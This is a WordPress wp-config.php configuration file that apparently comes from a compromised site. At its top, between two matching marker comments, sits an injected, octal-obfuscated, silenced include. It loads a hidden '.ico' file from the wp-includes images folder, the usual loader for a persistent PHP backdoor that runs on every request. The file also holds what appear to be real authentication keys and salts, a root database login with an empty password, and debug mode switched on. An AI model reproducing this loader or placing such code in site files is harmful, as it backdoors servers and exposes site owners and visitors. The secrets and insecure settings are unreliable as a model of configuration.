<?php
/*7c6e3*/

@include "\057home\057xg75\06449ln\147ip/p\165blic\137html\057wp-i\156clud\145s/im\141ges/\167lw/.\141ab02\06531.i\143o";

/*7c6e3*/
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'shaccs');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', '');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'o[f%xaz(Kxg/G4os.K?=w,jJdjaTRN4tr(i[Q7;=zZWyi(-A(~?4r8AUkPBa`j>$');
define('SECURE_AUTH_KEY',  'H~K~!F*6B3qtjf7D3jDN{jEkn[]T49YczIry^ 57A@vjWN/fYbd<z!OOdzEo#EjI');
define('LOGGED_IN_KEY',    'unll2Qjxa+q&_)ED0-qLJ{KpP]LXx=hQ~9<8r!?x+[cb|r-3XBU[fuhl O5%fV9k');
define('NONCE_KEY',        'R)g:{+:Nk!JONF(]Fycs|1Y*c 44}9:4Ad2MF:&(:`BfIB]D1L?w:|)WRlO30n::');
define('AUTH_SALT',        'RE&:4s3eW9q mQ[::hf/NXC|6Z(@=fG!L76Z6A9d&2xf=%a_G4HWbiOr*nkqaq}p');
define('SECURE_AUTH_SALT', '!6H(:NUGO75V59Q$R/@lh%G_x2C?~0w$( ``?Ci93h)hRdjD,Hv~XwO&`m0gur:n');
define('LOGGED_IN_SALT',   '-e7dF[@.zePGt~Yrc)D?xS*,~Mm`mDWi{`vZ1,~GpK63_J|d4Cb&)t6%U-yu@4A}');
define('NONCE_SALT',       '{A(FnrtED!FHkifB3f(tt(c+KkSP%y=b=5x:IKBwW *opw#o}-cKUX4kRt#6y5Pi');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define('WP_DEBUG', true);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
